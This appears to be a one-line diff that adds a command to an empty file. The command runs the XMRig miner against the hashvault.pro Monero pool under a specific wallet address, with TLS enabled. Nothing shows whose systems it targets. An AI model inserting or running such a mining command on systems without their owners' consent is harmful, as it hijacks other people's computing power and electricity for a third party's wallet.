@@ -1,0 +1,1 @@
+./xmrig --url pool.hashvault.pro:80 --user hvxy6zmPXw2QTtk1viRXu15u9wkVYWrqm5HaoELdw7uNifh3gKoQrsdd9Q71cfd5kN2iJKG2wjuaZBtHpwg7teRw9kh2Q9iaqy --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
